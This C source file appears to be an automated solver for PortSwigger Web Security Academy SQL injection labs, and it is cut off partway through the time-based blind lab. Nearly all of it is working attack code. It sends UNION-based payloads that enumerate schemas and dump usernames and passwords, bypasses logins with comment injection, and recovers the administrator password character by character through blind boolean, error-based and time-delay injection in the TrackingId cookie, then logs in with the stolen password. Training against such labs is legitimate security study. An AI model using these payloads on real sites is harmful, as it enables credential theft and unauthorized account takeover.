#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>


typedef struct {
    const char *lab_name;
    int lab_id;
} LabMapping;

int extract_lab_id(const char *html_content) {
    // PAAS supports the SQLi labs listed below
    LabMapping lab_mappings[] = {
            {"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",       1},
            {"SQL injection vulnerability allowing login bypass",                                   2},
            {"SQL injection attack, querying the database type and version on Oracle",              3},
            {"SQL injection attack, querying the database type and version on MySQL and Microsoft", 4},
            {"SQL injection attack, listing the database contents on non-Oracle databases",         5},
            {"SQL injection attack, listing the database contents on Oracle",                       6},
            {"SQL injection UNION attack, determining the number of columns returned by the query", 7},
            {"SQL injection UNION attack, finding a column containing text",                        8},
            {"SQL injection UNION attack, retrieving data from other tables",                       9},
            {"SQL injection UNION attack, retrieving multiple values in a single column",           10},
            {"Blind SQL injection with conditional responses",                                      11},
            {"Blind SQL injection with conditional errors",                                         12},
            {"Visible error-based SQL injection",                                                   13},
            {"Blind SQL injection with time delays",                                                14},
            {"Blind SQL injection with time delays and information retrieval",                      15}
    };

    const char *title_start = "<title>";
    const char *title_end = "</title>";
    const char *start = strstr(html_content, title_start);
    const char *end = strstr(start, title_end);
    int lab_id = -1;

    if (start != NULL && end != NULL) {
        start += strlen(title_start);

        char lab_name[100] = "";
        size_t lab_name_len = end - start;
        if (lab_name_len >= sizeof(lab_name)) {
            fprintf(stderr, "Lab name is too long! (error code 24)\n");
            return -1;
        }

        strncpy(lab_name, start, end - start);
        lab_name[lab_name_len] = '\0';

        for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
            if (strcmp(lab_name, lab_mappings[i].lab_name) == 0) {
                lab_id = lab_mappings[i].lab_id;
                return lab_id;
            }
        }
    }

    return -1;
}


int performCurlRequest(CURL *curl, char* response_buffer) {
    memset(response_buffer, 0, strlen(response_buffer));
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return 1;
    }
    return 0;
}


size_t write_callback(const char *data, size_t size, size_t count, void *output_buffer) {
    size_t total_size = size * count;
    strncat(output_buffer, data, strlen(data));
    return total_size;
}


static size_t write_header_callback(const char *data, size_t size, size_t count, void *output_header) {
    size_t total_size = size * count;
    strncat(output_header, data, strlen(data));
    return total_size;
}


int extract_csrf_token(const char *html_content, char *csrf_token, size_t token_size) {
    const char *token_start = strstr(html_content, "value=\"");
    const char *token_end = strchr(token_start+7, '\"');

    if (token_start && token_end) {
        token_start += 7;
        size_t token_length = token_end - token_start;

        if (token_length < token_size) {
            strncpy(csrf_token, token_start, token_length);
            csrf_token[token_length] = '\0';
            return 0;
        }
        else {
            fprintf(stderr, "Invalid token size!\n");
            return -1;
        }
    }
    else {
        fprintf(stderr, "Unable to find token_start or token_end!\nhttps://0ad300150411daef8190205500ff00a3.web-security-academy.net/");
        return -1;
    }
}


int extract_value(const char* html_content, const char* filter_value_start, const char* filter_value_end, char* value, int token_start_plus) {
    const char *token_start = strstr(html_content, filter_value_start);
    if (token_start) {
        token_start += token_start_plus;
        const char *token_end = strstr(token_start, filter_value_end);
        if (token_end) {
            strncpy(value, token_start, token_end - token_start);
            value[token_end - token_start] = '\0';
            return 1;
        }
    }
    return -1;
}


int clear_url(char *url) {
    const char *http_prefix = "http://";
    const char *https_prefix = "https://";
    size_t http_prefix_len = strlen(http_prefix);
    size_t https_prefix_len = strlen(https_prefix);

    if (strncmp(url, http_prefix, http_prefix_len) == 0 || strncmp(url, https_prefix, https_prefix_len) == 0) {
        int slashCount = 0;

        for (int i = 0; url[i] != '\0'; i++) {
            if (url[i] == '/') {
                slashCount++;
                if (slashCount == 3) {
                    url[i] = '\0';
                    break;
                }
            }
        }

        size_t length = strlen(url);
        if (length > 0 && strlen(url)-1 == '\n') {
            url[length - 1] = '\0';
        }

        return 1;
    }
    return 0;
}


void show_paas_ascii_art() {
    system("clear");
    printf("\033[38;5;208m  _____  \033[0m                 \033[38;5;208m _____ \n");
    printf("\033[38;5;208m |  __ \\ \033[0m /\\       /\\    \033[38;5;208m/ ____|  \n");
    printf("\033[38;5;208m | |__) | \033[0m/\\\\      /\\\\  \033[38;5;208m | (___    \n");
    printf("\033[38;5;208m |  ___/\033[0m /  \\\\    /  \\\\ \033[38;5;208m \\\\___ \\\\ \n");
    printf("\033[38;5;208m | | \033[0m   /====\\\\  /====\\\\  \033[38;5;208m____)  \n");
    printf("\033[38;5;208m |_| \033[0m  /      \\\\/      \\\\ \033[38;5;208m|_____/ \n");
    printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
    printf("by \033[38;5;208mmr246\033[0m \n\n");
}


int detect_column_count(char *url, char *response_buffer, CURL *curl, char* comment_sign) {
    int i = 1;
    int max_attempts = 15;
    while (i < max_attempts) {
        if (strstr(response_buffer, "Internal Server Error") != NULL) {
            i -= 2;
            break;
        }
        char temp_url[100] = "";
        strncpy(temp_url, url, strlen(url));
        snprintf(url, 300,"%s/filter?category=Accessories'+order+by+%d%s", temp_url, i, comment_sign);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        if (performCurlRequest(curl, response_buffer) != 0)
            return -1;
        i++;
        clear_url(url);
    }
    return i;
}


int vulnerabilities(char *url) {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    char *response_buffer = (char*)calloc(500000, 1);
    char *csrf_token = (char*)calloc(64, sizeof(char));
    int return_value = -1;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);

        if (performCurlRequest(curl, response_buffer) != 0)
            goto quit;

        int selected_lab = -1;
        selected_lab = extract_lab_id(response_buffer);

        if (selected_lab == 1) {
            strncat(url, "/filter?category=Accessories'+or+1+=1--", 39);
            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 2) {
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512];
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator'--&password=password", csrf_token);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            clear_url(url);
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 3) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, curl, "--");
            if (i == 0)
                goto quit;

            // step two - determine the database type
            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
            char sqli_payload_repeat[150] = ",'test'";
            char sqli_payload_end[15] = "+FROM+dual--";

            int f = 1;
            while(f != i) {
                strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
                f++;
            }

            strncat(sqli_payload, sqli_payload_end, strlen(sqli_payload_end));
            strncat(url, sqli_payload, strlen(sqli_payload));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step three - exploit
            char sqli_payload_2[300] = "/filter?category=Accessories'+UNION+SELECT+BANNER";
            char sqli_payload_repeat_2[150] = ",+NULL";
            char sqli_payload_end_2[25] = "+FROM+v$version--";

            while(f > 1) {
                strncat(sqli_payload_2, sqli_payload_repeat_2, strlen(sqli_payload_repeat_2));
                f--;
            }

            strncat(sqli_payload_2, sqli_payload_end_2, strlen(sqli_payload_end_2));
            strncat(url, sqli_payload_2, strlen(sqli_payload_2));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }
        else if (selected_lab == 4) {
            int i = detect_column_count(url, response_buffer, curl, "%23");
            if (i == 0)
                goto quit;

            // step two - determine the database type
            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
            char sqli_payload_repeat[150] = ",'test'";
            char sqli_payload_end[10] = "%23";
            int f = 1;
            while (f < i) {
                strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
                f++;
            }

            strncat(sqli_payload, sqli_payload_end, strlen(sqli_payload_end));
            strncat(url, sqli_payload, strlen(sqli_payload));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step three - exploit
            char sqli_payload_2[300] = "/filter?category=Accessories'+UNION+SELECT+@@version";
            char sqli_payload_repeat_2[150] = ",+NULL";
            char sqli_payload_end_2[10] = "%23";

            f = 1;
            while (f < i) {
                strncat(sqli_payload_2, sqli_payload_repeat_2, strlen(sqli_payload_repeat_2));
                f++;
            }

            strncat(sqli_payload_2, sqli_payload_end_2, strlen(sqli_payload_end_2));
            strncat(url, sqli_payload_2, strlen(sqli_payload_2));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 5) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, curl, "--");
            if (i == 0)
                goto quit;

            // step two - retrieve the list of tables in the database
            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+table_name";
            char sqli_payload_repeat[150] = ",+NULL";
            char sqli_payload_end[50] = "+FROM+information_schema.tables--";
            int f = 1;
            while (f < i) {
                strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
                f++;
            }

            strncat(sqli_payload, sqli_payload_end, strlen(sqli_payload_end));
            strncat(url, sqli_payload, strlen(sqli_payload));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step three - finding the name of the table containing user credentials
            char users[25] = "";
            extract_value(response_buffer, "users_", "<", users, 0);

            // step four  - retrieve the details of the columns in the user table
            char sqli_payload2[300] = "/filter?category=Accessories'+UNION+SELECT+column_name";
            char sqli_payload_repeat2[150] = ",+NULL";
            char sqli_payload_end2[150] = "";
            snprintf(sqli_payload_end2, 150, "+FROM+information_schema.columns+WHERE+table_name='%s'--", users);

            int f2 = 1;
            while (f2 < i) {
                strncat(sqli_payload2, sqli_payload_repeat2, strlen(sqli_payload_repeat2));
                f2++;
            }
            strncat(sqli_payload2, sqli_payload_end2, strlen(sqli_payload_end2));
            strncat(url, sqli_payload2, strlen(sqli_payload2));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step five  - finding the names of the columns containing usernames and passwords
            char users_column_name[25] = "";
            extract_value(response_buffer, "username_", "<", users_column_name, 0);

            char users_column_password[25] = "";
            extract_value(response_buffer, "password_", "<", users_column_password, 0);

            // step six  - retrieve the details of the columns in the users table
            char sqli_payload3[100] = "";

            snprintf(sqli_payload3, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", users_column_name, users_column_password);
            char sqli_payload_repeat3[10] = ",+NULL";
            char sqli_payload_end3[40];
            snprintf(sqli_payload_end3, 40, "+FROM+%s--", users);
            int f3 = 2;
            while (f3 < i) {
                strncat(sqli_payload3, sqli_payload_repeat3, strlen(sqli_payload_repeat3));
                f3++;
            }
            strncat(sqli_payload3, sqli_payload_end3, strlen(sqli_payload_end3));
            strncat(url, sqli_payload3, strlen(sqli_payload3));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step seven - extract administrator's password from column
            char admin_account_password[30] = "";
            extract_value(response_buffer, "administrator", "<", admin_account_password, 51);

            // step eight  - login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 6) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, curl, "--");
            if (i == 0)
                goto quit;

            // step two - retrieve the list of tables in the database
            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+table_name";
            char sqli_payload_repeat[150] = ",NULL";
            char sqli_payload_end[30] = "+FROM+all_tables--";
            int f = 1;
            while (f < i) {
                strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
                f++;
            }

            strncat(sqli_payload, sqli_payload_end, strlen(sqli_payload_end));
            strncat(url, sqli_payload, strlen(sqli_payload));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step three  - finding the names of the columns containing usernames and passwords
            char users_table_name[25] = "";
            extract_value(response_buffer, ">USERS_", "<", users_table_name, 1);

            // step four  - retrieve the details of the columns in the user table
            char sqli_payload2[300] = "/filter?category=Accessories'+UNION+SELECT+column_name";
            char sqli_payload_repeat2[150] = ",NULL";
            char sqli_payload_end2[150] = "";
            snprintf(sqli_payload_end2, 150, "+FROM+all_tab_columns+WHERE+table_name='%s'--", users_table_name);

            int f2 = 1;
            while (f2 < i) {
                strncat(sqli_payload2, sqli_payload_repeat2, strlen(sqli_payload_repeat2));
                f2++;
            }
            strncat(sqli_payload2, sqli_payload_end2, strlen(sqli_payload_end2));
            strncat(url, sqli_payload2, strlen(sqli_payload2));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step five  - finding the names of the columns containing usernames and passwords
            char users_column_name[25] = "";
            extract_value(response_buffer, "USERNAME_", "<", users_column_name, 0);

            char users_column_password[25] = "";
            extract_value(response_buffer, "PASSWORD_", "<", users_column_password, 0);

            // step six  - retrieve the details of the columns in the users table
            char sqli_payload3[100] = "";
            snprintf(sqli_payload3, 100,"/filter?category=Accessories'+UNION+SELECT+%s,+%s", users_column_name, users_column_password);
            char sqli_payload_repeat3[] = ",+NULL";
            char sqli_payload_end3[40] = "";
            snprintf(sqli_payload_end3, 40, "+FROM+%s--", users_table_name);
            int f3 = 2;
            while (f3 < i) {
                strncat(sqli_payload3, sqli_payload_repeat3, strlen(sqli_payload_repeat3));
                f3++;
            }
            strncat(sqli_payload3, sqli_payload_end3, strlen(sqli_payload_end3));
            strncat(url, sqli_payload3, strlen(sqli_payload3));

            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
            clear_url(url);

            // step seven - extract administrator's password from column
            char admin_account_password[30] = "";
            extract_value(response_buffer, "administrator", "<", admin_account_password, 51);

            // step eight  - login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 7) {
            char sqli_payload[] = "'+UNION+SELECT+NULL";
            char sqli_payload2[100] = "";
            char sqli_payload3[] = "--";
            char sqli_payload_end[250] = "";
            int i = 1;
            while (i) {
                strncat(sqli_payload2, ",NULL", 5);
                snprintf(sqli_payload_end, 250, "%s%s%s", sqli_payload, sqli_payload2, sqli_payload3);
                strncat(url, "/filter?category=Accessories", 28);
                strncat(url, sqli_payload_end, strlen(sqli_payload_end));
                curl_easy_setopt(curl, CURLOPT_URL, url);

                if (performCurlRequest(curl, response_buffer) != 0)
                    goto quit;

                if (strstr(response_buffer, "Internal Server Error") == NULL)
                    break;

                i++;
                clear_url(url);
                snprintf(sqli_payload, 20, "'+UNION+SELECT+NULL");
            }
        }

        else if (selected_lab == 8) {
            // step one - determine the number of columns
            int i = detect_column_count(url, response_buffer, curl, "--");
            if (i == 0)
                goto quit;

            // step two - extracting the text to be displayed
            char db_string[30] = "";
            extract_value(response_buffer, "ing: '", "\'", db_string, 6);

            // step three  - trying replacing each null with the random value
            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+NULL";
            char sqli_payload_repeat[150] = ",NULL";
            char sqli_payload_end[3] = "--";
            char sqli_payload_repeat2[30] = "";
            snprintf(sqli_payload_repeat2, 30, ",'%s'", db_string);

            int column = 1;

            int until_column_count = 1;
            while(until_column_count < i) {
                int f2 = 1;
                while (f2 < i) {
                    if (f2 == column) {
                        strncat(sqli_payload, sqli_payload_repeat2, strlen(sqli_payload_repeat2));
                    } else {
                        strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
                    }
                    f2++;
                }
                strncat(sqli_payload, sqli_payload_end, strlen(sqli_payload_end));
                strncat(url, sqli_payload, strlen(sqli_payload));
                curl_easy_setopt(curl, CURLOPT_URL, url);

                if (performCurlRequest(curl, response_buffer) != 0)
                    goto quit;
                clear_url(url);
                strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 47);
                until_column_count++;
                column++;
            }
        }

        else if (selected_lab == 9) {
            strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 56);
            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            clear_url(url);
            strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 74);
            curl_easy_setopt(curl, CURLOPT_URL, url);

             if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            // extract administrator's password from column
            char admin_account_password[30] = "";
            extract_value(response_buffer, "administrator", "<", admin_account_password, 51);

            // login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 10) {
            strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 55);
            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            clear_url(url);
            strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 84);
            curl_easy_setopt(curl, CURLOPT_URL, url);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            // extract administrator's password from column
            char admin_account_password[30] = "";
            extract_value(response_buffer, "administrator", "<", admin_account_password, 14);

            // login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            extract_csrf_token(response_buffer, csrf_token, 64);
            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 11) {
            char *header = (char*)calloc(50000, 1);
            char tracking_id_cookie[100] = "";
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
            curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_header_callback);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }

            extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);

            show_paas_ascii_art();
            curl_easy_reset(curl);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);

            char password[50] = "";
            char password_temp[50] = "";
            char sqli_payload[150] = "";
            int l = 1;

            while(l < 21) {
                char character = 'a';
                int number = 0;
                int i = 0;
                while (i < 36) {
                    if (character + i > 'z') {
                        snprintf(sqli_payload, 150, "TrackingId=%s' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%d", tracking_id_cookie, l, number);
                        number++;
                    }
                    else {
                    snprintf(sqli_payload, 150, "TrackingId=%s' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%c", tracking_id_cookie, l, character+i);
                    }
                    curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);

                    if (performCurlRequest(curl, response_buffer) != 0) {
                        free(header);
                        goto quit;
                    }
                    if (strstr(response_buffer, "Welcome back!") != NULL) {
                        if (character + i > 'z') {
                            strncpy(password_temp, password, strlen(password));
                            snprintf(password, 50, "%s%d", password_temp, number-1);
                            break;
                        }
                        else {
                            strncpy(password_temp, password, strlen(password));
                            snprintf(password, 50, "%s%c", password_temp, character+i);
                            break;
                        }
                    }
                    i++;
                }
                l++;
            }

            // login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }
            free(header);
        }

        else if (selected_lab == 12) {
            char *header = (char*)calloc(50000, 1);
            char tracking_id_cookie[100];
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
            curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_header_callback);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }

            extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);

            show_paas_ascii_art();
            curl_easy_reset(curl);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);

            char password[50] = "";
            char password_temp[50] = "";
            char alphabetAndNumbers[] = "0123456789abcdefghijklmnopqrstuvwxyz";
            char sqli_payload[250] = "";
            int l = 1;
            int left = 0;
            int right = 35;
            int mid = -1;

            while(l < 21) {
                left = 0;
                right = 35;
                while (left <= right) {
                    mid = left + (right - left)/2;
                    int asciiValue = (int)alphabetAndNumbers[mid];
                    snprintf(sqli_payload, 250, "TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",tracking_id_cookie, l, asciiValue);
                    curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);

                    if (performCurlRequest(curl, response_buffer) != 0) {
                        free(header);
                        goto quit;
                    }
                    if (strstr(response_buffer, "Internal") != NULL) {
                        strncpy(password_temp, password, strlen(password));
                        snprintf(password, 50, "%s%c", password_temp, alphabetAndNumbers[mid]);
                        break;
                    }

                    snprintf(sqli_payload, 250, "TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))<%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",tracking_id_cookie, l, alphabetAndNumbers[mid]);
                    curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);

                    if (performCurlRequest(curl, response_buffer) != 0) {
                        free(header);
                        goto quit;
                    }
                    if (strstr(response_buffer, "Internal") == NULL) {
                        left = mid + 1;
                    }
                    else {
                        right = mid - 1;
                    }
                }
                l++;
            }

            // login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIE, NULL);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }
            free(header);
        }

        else if (selected_lab == 13) {
            curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            char admin_account_password[30] = "";
            extract_value(response_buffer, "integer: ", "\"", admin_account_password, 10);

            // login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIE, NULL);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 14) {
            curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");

            if (performCurlRequest(curl, response_buffer) != 0)
                goto quit;
        }

        else if (selected_lab == 15) {
            char *header = (char*)calloc(50000, 1);
            char tracking_id_cookie[100] = "";
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
            curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_header_callback);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

             if (performCurlRequest(curl, response_buffer) != 0) {
                 free(header);
                 goto quit;
            }

            extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);

            show_paas_ascii_art();
            curl_easy_reset(curl);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);

            char password[50] = "";
            char password_temp[50] = "";
            char alphabetAndNumbers[] = "0123456789abcdefghijklmnopqrstuvwxyz";
            memset(password, 0, sizeof(password));
            char sqli_payload[200] = "";
            int l = 1;
            int asciiValue = -1;
            double totalTime = -1.00;

            while(l < 21) {
                int i = 0;
                while (i < 36) {
                    totalTime = 0.00;
                    asciiValue = (int)alphabetAndNumbers[i];
